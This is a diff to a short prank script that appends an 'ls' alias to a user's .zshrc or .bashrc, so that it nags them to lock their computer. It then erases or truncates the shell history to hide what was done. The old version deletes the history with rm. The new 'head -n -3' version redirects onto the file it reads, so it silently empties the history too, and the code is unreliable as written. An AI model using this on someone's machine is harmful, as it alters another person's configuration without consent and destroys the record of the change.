@@ -4,11 +4,11 @@ USED_SHELL="$(basename $SHELL)"
 LS_PATH="$(which ls)"
 
 if [[ $USED_SHELL == "zsh" ]]; then
-    echo "alias ls='echo You need to lock your computer when you walk away && /usr/bin/ls $@'" >> ~/.zshrc
-    rm ~/.zsh_history
+    echo "alias ls='echo You need to lock your computer when you walk away && /usr/bin/ls --color=tty $@'" >> ~/.zshrc
+    head -n -3 ~/.zsh_history > ~/.zsh_history
 fi
  
 if [[ $USED_SHELL == "bash" ]]; then
-    echo "alias ls='echo You need to lock your computer when you walk away && /usr/bin/ls $@'" >> ~/.bashrc
-    rm ~/.bash_history
+    echo "alias ls='echo You need to lock your computer when you walk away && /usr/bin/ls --color=tty $@'" >> ~/.bashrc
+    head -n -3 ~/.bash_history > ~/.bash_history
 fi
